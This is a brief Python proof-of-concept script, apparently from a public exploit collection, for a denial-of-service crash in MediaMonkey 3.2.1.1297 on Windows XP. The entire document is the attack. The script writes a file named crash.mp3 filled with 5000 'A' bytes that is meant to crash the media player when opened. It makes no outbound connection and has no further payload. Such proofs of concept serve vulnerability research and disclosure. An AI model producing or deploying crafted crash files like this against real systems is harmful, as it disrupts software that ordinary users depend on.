#Mediamonkey v. 3.2.1.1297 DOS POC
#vulnerble application link http://www.mediamonkey.com/trialpay
#tested on XP SP2/3

#!/usr/bin/python

filename = "crash.mp3"


junk = "\x41" * 5000

textfile = open(filename , 'w')
textfile.write(junk)
textfile.close()